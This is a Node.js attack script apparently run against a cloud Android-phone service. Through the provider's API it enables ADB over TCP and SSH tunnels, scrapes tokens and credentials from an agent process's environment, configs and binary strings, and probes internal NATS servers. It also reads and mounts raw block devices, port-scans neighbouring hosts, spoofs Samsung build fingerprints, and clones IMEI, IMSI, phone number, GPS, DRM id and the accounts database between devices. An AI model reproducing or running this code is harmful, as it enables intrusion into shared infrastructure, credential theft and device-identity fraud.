#!/usr/bin/env node
/**
 * FULL SWEEP — Retry: ADB TCP, D2 verify, NATS NKey, DM data extraction, network scan
 */

const path = require('path');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const { execSync } = require('child_process');

const { AK, SK, HOST, SVC, D1, D2, CT, SHD, sh, P } = require('../shared/vmos_api');
const OUT = path.join(__dirname, '..', 'output', 'full_sweep_results');

const save = (f, d) => fs.writeFileSync(`${OUT}/${f}`, typeof d === 'string' ? d : JSON.stringify(d, null, 2));
const R = {};

function sign(body) {
  const xd = new Date().toISOString().replace(/[-:]/g,'').replace(/\.\d{3}Z$/,'Z');
  const sd = xd.slice(0,8);
  const bh = crypto.createHash('sha256').update(body,'utf8').digest('hex');
  const can = [`host:${HOST}`,`x-date:${xd}`,`content-type:${CT}`,`signedHeaders:${SHD}`,`x-content-sha256:${bh}`].join('\n');
  const ch = crypto.createHash('sha256').update(can,'utf8').digest('hex');
  const sts = ['HMAC-SHA256',xd,`${sd}/${SVC}/request`,ch].join('\n');
  let k = crypto.createHmac('sha256',SK).update(sd).digest();
  k = crypto.createHmac('sha256',k).update(SVC).digest();
  k = crypto.createHmac('sha256',k).update('request').digest();
  return {'content-type':CT,'x-date':xd,'x-host':HOST,'authorization':`HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256',k).update(sts).digest('hex')}`};
}

function post(ep, data, timeout) {
  return new Promise(ok => {
    const b = JSON.stringify(data||{}); const h = sign(b); const buf = Buffer.from(b);
    const req = https.request({hostname:HOST,path:ep,method:'POST',headers:{...h,'content-length':buf.length},timeout:(timeout||30)*1000,rejectUnauthorized:false},res=>{
      let d='';res.on('data',c=>d+=c);res.on('end',()=>{try{ok(JSON.parse(d));}catch{ok({code:-1,raw:d.slice(0,2000)});}});
    });
    req.on('timeout',()=>{req.destroy();ok({code:-99,msg:'timeout'});});
    req.on('error',e=>ok({code:-99,msg:e.message}));req.write(buf);req.end();
  });
}

async function main() {
  console.log('█'.repeat(75));
  console.log('  RETRY: ADB, D2 VERIFY, NATS NKEY, DM EXTRACT, NETWORK');
  console.log('█'.repeat(75));

  // ── R1: ADB TCP ENABLE ──
  console.log('\n── R1: ADB TCP ENABLE ──');
  P('[R1a] Enable ADB + TCP port 5555 on D1...');
  const adbTcp = await sh(D1, [
    'setprop service.adb.tcp.port 5555',
    'setprop persist.adb.tcp.port 5555',
    'stop adbd 2>/dev/null; start adbd 2>/dev/null',
    'sleep 2',
    'echo "ADB_TCP=$(getprop service.adb.tcp.port)"',
    'echo "PERSIST=$(getprop persist.adb.tcp.port)"',
    'echo "ADBD=$(getprop init.svc.adbd)"',
    'ss -tlnp | grep -E "5555|adbd"',
    'echo "IP=$(ip addr show eth0 2>/dev/null | grep inet | head -1)"',
    'ip addr show 2>/dev/null | grep "inet " | grep -v 127.0.0.1',
  ].join('; '), 20);
  save('retry_adb_tcp.txt', adbTcp);
  P(`  ${adbTcp}`);
  R.adb_tcp = adbTcp;

  // If IP found, try ADB connect
  const ipMatch = adbTcp.match(/inet\s+([\d.]+)/);
  if (ipMatch) {
    P(`  Device IP: ${ipMatch[1]} — trying ADB connect...`);
    try {
      const r = execSync(`timeout 8 adb connect ${ipMatch[1]}:5555 2>&1`, {timeout:12000}).toString().trim();
      P(`  ADB: ${r}`);
      R.adb_connect = r;
    } catch(e) { P(`  ADB err: ${e.message.slice(0,80)}`); }
  }

  // Also try the SSH ADB tunnel properly
  P('[R1b] Fresh ADB info + SSH tunnel...');
  const adbInfo = await post('/vcpcloud/api/padApi/adb', {padCode:D1,enable:1});
  if (adbInfo.code === 200 && adbInfo.data) {
    const d = adbInfo.data;
    const m = d.command.match(/-L\s+(\d+):(\S+):(\d+)/);
    if (m) {
      const [, lp, ph, rp] = m;
      // The SSH command uses a special username format and key-based auth
      // Key is provided as base64 — save properly
      const keyPath = `${OUT}/adb_ssh_key`;
      fs.writeFileSync(keyPath, d.key + '\n', {mode: 0o600});
      
      // Extract user@host -p port from command
      const uhMatch = d.command.match(/(\S+@\S+)\s+-p\s+(\d+)/);
      if (uhMatch) {
        P(`  SSH: ${uhMatch[1]} -p ${uhMatch[2]} -L ${lp}:${ph}:${rp}`);
        
        // Try with -o PasswordAuthentication=no and key file
        try {
          const cmd = `timeout 12 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -oHostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -i ${keyPath} ${uhMatch[1]} -p ${uhMatch[2]} -L ${lp}:${ph}:${rp} -Nf 2>&1 || true`;
          const r = execSync(cmd, {timeout:15000}).toString().trim();
          P(`  SSH: ${r.slice(0,200)}`);
          
          // Try ADB connect
          await new Promise(r=>setTimeout(r,2000));
          try {
            const adb = execSync(`timeout 8 adb connect localhost:${lp} 2>&1`, {timeout:12000}).toString().trim();
            P(`  ADB localhost:${lp}: ${adb}`);
            R.adb_tunnel = adb;
          } catch(e) { P(`  ADB err: ${e.message.slice(0,60)}`); }
        } catch(e) {
          P(`  SSH err: ${(e.stderr||e.message||'').toString().slice(0,120)}`);
        }
      }
    }
  }

  // ── R2: D2 VERIFY AFTER RESTART ──
  console.log('\n── R2: D2 VERIFY AFTER RESTART ──');
  P('[R2a] D2 shell check...');
  const d2Shell = await sh(D2, [
    'echo "MODEL=$(getprop ro.product.model)"',
    'echo "BRAND=$(getprop ro.product.brand)"',
    'echo "FP=$(getprop ro.build.fingerprint)"',
    'echo "IMEI=$(getprop persist.sys.cloud.imeinum)"',
    'echo "PHONE=$(getprop persist.sys.cloud.phonenum)"',
    'echo "AID=$(settings get secure android_id 2>/dev/null)"',
    'echo "DRM=$(getprop persist.sys.cloud.drm.id | head -c 40)"',
    'echo "GAID=$(settings get secure advertising_id 2>/dev/null)"',
  ].join('; '), 15);
  save('retry_d2_shell.txt', d2Shell);
  P(`  D2 Shell:\n${d2Shell}`);
  R.d2_shell = d2Shell;

  // D2 API props
  P('[R2b] D2 API properties...');
  const d2Props = await post('/vcpcloud/api/padApi/padProperties', {padCode:D2});
  if (d2Props.code === 200) {
    const sys = d2Props.data?.systemPropertiesList || [];
    const model = sys.find(p=>p.propertiesName==='ro.product.model');
    const brand = sys.find(p=>p.propertiesName==='ro.product.brand');
    const fp = sys.find(p=>p.propertiesName==='ro.build.fingerprint');
    P(`  D2 API: model=${model?.propertiesValue} brand=${brand?.propertiesValue}`);
    P(`  D2 FP: ${fp?.propertiesValue}`);
    R.d2_model = model?.propertiesValue;
    R.d2_fp = fp?.propertiesValue;
    save('retry_d2_api_props.json', d2Props);
  }

  // If D2 still not Samsung, force again
  if (R.d2_model && R.d2_model !== 'SM-S9280') {
    P('[R2c] D2 still not Samsung — applying Samsung S24 Ultra props...');
    const samsungProps = {
      'ro.product.model': 'SM-S9280',
      'ro.product.brand': 'samsung',
      'ro.product.manufacturer': 'samsung',
      'ro.product.name': 'e3qzcx',
      'ro.product.device': 'e3q',
      'ro.product.board': 'pineapple',
      'ro.build.fingerprint': 'samsung/e3qzcx/e3q:15/AP3A.240905.015.A2/S9280ZCS4BYDF:user/release-keys',
      'ro.build.display.id': 'AP3A.240905.015.A2.S9280ZCS4BYDF',
      'ro.build.id': 'AP3A.240905.015.A2',
      'ro.build.version.incremental': 'S9280ZCS4BYDF',
      'ro.build.version.release': '15',
      'ro.build.description': 'e3qzcx-user 15 AP3A.240905.015.A2 S9280ZCS4BYDF release-keys',
      'ro.build.tags': 'release-keys',
      'gpuVendor': 'Qualcomm',
      'gpuRenderer': 'Adreno (TM) 750',
    };
    
    const r = await post('/vcpcloud/api/padApi/updatePadAndroidProp', {
      padCode: D2, props: samsungProps,
    }, 30);
    save('retry_d2_samsung.json', r);
    P(`  Samsung props: code=${r.code} msg=${r.msg||''}`);
    
    if (r.code === 200) {
      P('  Waiting 25s for restart...');
      await new Promise(r=>setTimeout(r,25000));
      const verify = await sh(D2, 'getprop ro.product.model; getprop ro.product.brand; getprop ro.build.fingerprint', 15);
      save('retry_d2_samsung_verify.txt', verify);
      P(`  After restart: ${verify}`);
      R.d2_samsung = verify;
    }
  }

  // ── R3: NATS NKEY AUTH ATTEMPT ──
  console.log('\n── R3: NATS NKEY AUTH ──');
  P('[R3a] NATS info with xkey...');
  // The NATS server provided xkey — try connecting with NKEY auth
  const natsXkey = 'XAA6PP7F6E5GMIWBSFOWMUW4XFF5HSXUR5MHZ5AAS3YSWOGU72YHV32C';
  
  // Try to extract NATS token/credentials from agent environment
  const natsEnv = await sh(D1, [
    'echo "=== AGENT ENV ==="',
    'cat /proc/413/environ 2>/dev/null | tr "\\0" "\\n" | grep -iE "NATS|TOKEN|USER|PASS|AUTH|CRED|KEY" | head -20',
    'echo "=== AGENT FD ==="',
    'ls -la /proc/413/fd/ 2>/dev/null | grep socket | head -10',
    'echo "=== NATS SOCKETS ==="',
    'cat /proc/413/net/tcp 2>/dev/null | head -10',
    'echo "=== CONFIG FILES ==="',
    'find /data/local/oicq -name "*.conf" -o -name "*.json" -o -name "*.toml" -o -name "*.yaml" -o -name "*.key" -o -name "*.cred" 2>/dev/null',
    'echo "=== NATS CRED FILES ==="',
    'find /data/local/oicq -name "*nats*" -o -name "*cred*" -o -name "*auth*" -o -name "*token*" 2>/dev/null',
  ].join('; '), 20);
  save('retry_nats_env.txt', natsEnv);
  P(`  NATS env: ${natsEnv.slice(0,400)}`);
  R.nats_env = natsEnv;

  // Read ALL config files found
  P('[R3b] Read all agent config files...');
  const allConfs = await sh(D1, [
    'for f in /data/local/oicq/webrtc/conf/*.json /data/local/oicq/cg_daemon/conf/*.toml /data/local/oicq/*.conf; do echo "=== $f ==="; cat "$f" 2>/dev/null | head -30; done',
  ].join('; '), 20);
  save('retry_all_configs.txt', allConfs);
  P(`  Configs: ${allConfs.split('\n').length} lines`);

  // Try NATS CONNECT with token from xkey
  P('[R3c] NATS connect attempts...');
  const natsConnect = await sh(D1, [
    // Try anonymous CONNECT
    'echo -e "CONNECT {}\\r\\nSUB armcloud.task.incoming.* 1\\r\\nPING\\r\\n" | timeout 3 nc 192.168.200.51 4222 2>&1 | head -c 500',
    'echo "==="',
    // Try with ACCOUNT_A
    'echo -e "CONNECT {\\"name\\":\\"test\\",\\"verbose\\":true}\\r\\nPING\\r\\n" | timeout 3 nc 192.168.200.51 4222 2>&1 | head -c 500',
    'echo "==="',
    // Try NATS port on other cluster nodes
    'for h in 192.168.200.52 192.168.200.53; do echo "$h:4222:"; echo -e "\\r\\n" | timeout 2 nc $h 4222 2>&1 | head -c 200; echo; done',
  ].join('; '), 20);
  save('retry_nats_connect.txt', natsConnect);
  P(`  NATS connect: ${natsConnect.slice(0,400)}`);

  // ── R4: DM VOLUME DATA EXTRACTION ──
  console.log('\n── R4: DM VOLUME DATA EXTRACTION ──');
  P('[R4a] Read superblocks from dm-0/1/2...');
  const dmData = await sh(D1, [
    'echo "=== DM-0 first 4K strings ==="',
    'dd if=/dev/block/dm-0 bs=4096 count=4 skip=256 2>/dev/null | strings | grep -E "android|build|system|user|data|account" | head -10',
    'echo "=== DM-1 first 4K strings ==="',
    'dd if=/dev/block/dm-1 bs=4096 count=4 skip=256 2>/dev/null | strings | grep -E "android|build|system|user|data|account" | head -10',
    'echo "=== DM-2 strings ==="',
    'dd if=/dev/block/dm-2 bs=4096 count=4 skip=256 2>/dev/null | strings | grep -E "android|build|system|user|data|account" | head -10',
  ].join('; '), 20);
  save('retry_dm_data.txt', dmData);
  P(`  DM data: ${dmData.slice(0,300)}`);

  // Try to mount dm volumes read-only
  P('[R4b] Attempt read-only mount of dm volumes...');
  const dmMount = await sh(D1, [
    'mkdir -p /tmp/dm0 /tmp/dm1 /tmp/dm2',
    'mount -o ro /dev/block/dm-0 /tmp/dm0 2>&1 | head -1',
    'mount -o ro /dev/block/dm-1 /tmp/dm1 2>&1 | head -1',
    'mount -o ro /dev/block/dm-2 /tmp/dm2 2>&1 | head -1',
    'echo "=== DM0 ==="',
    'ls /tmp/dm0/ 2>/dev/null | head -20',
    'echo "=== DM1 ==="',
    'ls /tmp/dm1/ 2>/dev/null | head -20',
    'echo "=== DM2 ==="',
    'ls /tmp/dm2/ 2>/dev/null | head -20',
    // Try alternate mount with explicit fs type
    'mount -t ext4 -o ro /dev/block/dm-0 /tmp/dm0 2>&1 | head -1',
    'mount -t f2fs -o ro /dev/block/dm-0 /tmp/dm0 2>&1 | head -1',
    'ls /tmp/dm0/ 2>/dev/null | head -20',
    // Cleanup
    'umount /tmp/dm0 2>/dev/null; umount /tmp/dm1 2>/dev/null; umount /tmp/dm2 2>/dev/null',
  ].join('; '), 25);
  save('retry_dm_mount.txt', dmMount);
  P(`  DM mount: ${dmMount.slice(0,300)}`);
  R.dm_mount = dmMount;

  // ── R5: NETWORK SCAN FOR NEIGHBORS ──
  console.log('\n── R5: NETWORK SCAN ──');
  P('[R5a] Full network scan...');
  const netScan = await sh(D1, [
    'echo "=== OUR IP ==="',
    'ip addr show 2>/dev/null | grep "inet " | head -5',
    'echo "=== ARP ==="',
    'cat /proc/net/arp 2>/dev/null',
    'echo "=== ROUTES ==="',
    'ip route 2>/dev/null',
    'echo "=== GATEWAY PING ==="',
    'ping -c1 -W1 10.96.0.1 2>&1 | head -3',
    'echo "=== NEIGHBOR 8779 SCAN ==="',
    // Scan range around our IP
    'for i in $(seq 170 180); do ip="10.96.0.$i"; timeout 1 bash -c "echo >/dev/tcp/$ip/8779" 2>/dev/null && echo "$ip:8779 OPEN"; done 2>/dev/null',
    'for i in $(seq 1 10); do ip="10.0.96.$i"; timeout 1 bash -c "echo >/dev/tcp/$ip/8779" 2>/dev/null && echo "$ip:8779 OPEN"; done 2>/dev/null',
  ].join('; '), 25);
  save('retry_network_scan.txt', netScan);
  P(`  Network: ${netScan.slice(0,400)}`);
  R.network = netScan;

  // ── R6: DEEPER AGENT REVERSE ENGINEERING ──
  console.log('\n── R6: AGENT REVERSE ENGINEERING ──');
  P('[R6a] Agent binary analysis...');
  const agentRE = await sh(D1, [
    'echo "=== BINARY INFO ==="',
    'file /data/local/oicq/webrtc/webrtc 2>/dev/null | head -1',
    'ls -la /data/local/oicq/webrtc/webrtc 2>/dev/null',
    'echo "=== INTERESTING STRINGS ==="',
    'strings /data/local/oicq/webrtc/webrtc 2>/dev/null | grep -iE "nats://|token|password|secret|armcloud" | sort -u | head -20',
    'echo "=== URL STRINGS ==="',
    'strings /data/local/oicq/webrtc/webrtc 2>/dev/null | grep -E "https?://" | sort -u | head -20',
    'echo "=== API ENDPOINTS ==="',
    'strings /data/local/oicq/webrtc/webrtc 2>/dev/null | grep -E "/api/|/v1/|/v2/" | sort -u | head -15',
  ].join('; '), 25);
  save('retry_agent_re.txt', agentRE);
  P(`  Agent RE: ${agentRE.slice(0,400)}`);
  R.agent_re = agentRE;

  // ── R7: COMPREHENSIVE D1→D2 CLONE VIA ALL METHODS ──
  console.log('\n── R7: COMPREHENSIVE CLONE ──');
  
  // Clone via shell commands on D2
  P('[R7a] Shell-level property cloning D1→D2...');
  // Read D1 cloud properties
  const d1CloudProps = await sh(D1, [
    'getprop persist.sys.cloud.imeinum',
    'getprop persist.sys.cloud.imsinum',
    'getprop persist.sys.cloud.iccidnum',
    'getprop persist.sys.cloud.phonenum',
    'getprop persist.sys.cloud.macaddress',
    'getprop persist.sys.cloud.gps.lat',
    'getprop persist.sys.cloud.gps.lon',
    'getprop persist.sys.cloud.drm.id',
    'settings get secure android_id 2>/dev/null',
  ].join('; echo "|||"; '), 15);
  save('d1_cloud_props.txt', d1CloudProps);
  P(`  D1 cloud: ${d1CloudProps.slice(0,200)}`);

  // Set on D2
  const vals = d1CloudProps.split('|||').map(v=>v.trim());
  if (vals.length >= 8) {
    P('[R7b] Setting cloud properties on D2...');
    const setCmds = [
      `setprop persist.sys.cloud.imeinum "${vals[0]}"`,
      `setprop persist.sys.cloud.imsinum "${vals[1]}"`,
      `setprop persist.sys.cloud.iccidnum "${vals[2]}"`,
      `setprop persist.sys.cloud.phonenum "${vals[3]}"`,
      `setprop persist.sys.cloud.gps.lat "${vals[5]}"`,
      `setprop persist.sys.cloud.gps.lon "${vals[6]}"`,
      `setprop persist.sys.cloud.drm.id "${vals[7]}"`,
      `echo OK`,
    ];
    const setR = await sh(D2, setCmds.join('; '), 15);
    P(`  Set: ${setR}`);
    R.d2_set_props = setR;
  }

  // Extract and inject databases
  P('[R7c] Database extraction + injection...');
  const dbs = [
    '/data/system_ce/0/accounts_ce.db',
    '/data/system/users/0/settings_secure.xml',
  ];
  for (const dbPath of dbs) {
    const name = dbPath.split('/').pop();
    const b64 = await sh(D1, `base64 "${dbPath}" 2>/dev/null`, 30);
    if (b64 && b64.length > 50 && !b64.startsWith('[')) {
      save(`clone_${name}.b64`, b64);
      // Single chunk if small enough
      if (b64.length < 1800) {
        const inj = await sh(D2, `echo '${b64}' | base64 -d > "${dbPath}" && chmod 660 "${dbPath}" && echo OK`, 15);
        P(`  ${name}: extract=${b64.length}b inject=${inj}`);
      } else {
        P(`  ${name}: extract=${b64.length}b (too large for single inject)`);
      }
    } else {
      P(`  ${name}: extract failed`);
    }
  }

  // ── R8: FINAL VERIFICATION ──
  console.log('\n── R8: FINAL VERIFICATION ──');
  for (const [name, pad] of [['D1', D1], ['D2', D2]]) {
    P(`\n  ${name} (${pad}):`);
    
    const info = await post('/vcpcloud/api/padApi/padInfo', {padCode:pad});
    if (info.code === 200) {
      const d = info.data || {};
      P(`    Type: ${d.padType} | Android: ${d.androidVersion}`);
      P(`    IP: ${d.publicIp} | Country: ${d.country} | GPS: ${d.latitude},${d.longitude}`);
    }
    
    const props = await post('/vcpcloud/api/padApi/padProperties', {padCode:pad});
    if (props.code === 200) {
      const sys = props.data?.systemPropertiesList || [];
      const modem = props.data?.modemPropertiesList || [];
      const model = sys.find(p=>p.propertiesName==='ro.product.model');
      const brand = sys.find(p=>p.propertiesName==='ro.product.brand');
      const fp = sys.find(p=>p.propertiesName==='ro.build.fingerprint');
      const imei = modem.find(p=>p.propertiesName==='imei');
      const phone = modem.find(p=>p.propertiesName==='phonenum');
      P(`    Model: ${model?.propertiesValue} Brand: ${brand?.propertiesValue}`);
      P(`    FP: ${fp?.propertiesValue}`);
      P(`    IMEI: ${imei?.propertiesValue} Phone: ${phone?.propertiesValue}`);
    }
    
    const shell = await sh(pad, 'echo "M=$(getprop ro.product.model) B=$(getprop ro.product.brand) I=$(getprop persist.sys.cloud.imeinum) A=$(settings get secure android_id 2>/dev/null)"', 10);
    P(`    Shell: ${shell}`);
    
    save(`final_verify_${name.toLowerCase()}.json`, {info:info.data,props:props.data,shell});
  }

  // Save all results
  save('RETRY_RESULTS.json', R);

  console.log('\n' + '█'.repeat(75));
  console.log('  RETRY COMPLETE');
  console.log('█'.repeat(75));
  const newFiles = fs.readdirSync(OUT).filter(f=>f.startsWith('retry_')||f.startsWith('final_')).sort();
  for (const f of newFiles) console.log(`  ${f} (${fs.statSync(`${OUT}/${f}`).size}B)`);
  console.log(`  Total files: ${fs.readdirSync(OUT).length}`);
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
